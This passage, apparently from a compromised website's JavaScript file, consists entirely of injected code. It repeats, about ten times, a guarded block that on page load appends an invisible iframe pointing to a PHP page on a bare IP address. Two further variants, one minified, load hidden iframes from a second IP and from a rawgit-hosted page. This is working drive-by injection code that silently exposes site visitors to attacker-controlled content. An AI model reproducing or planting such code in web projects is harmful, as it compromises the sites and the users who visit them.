		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});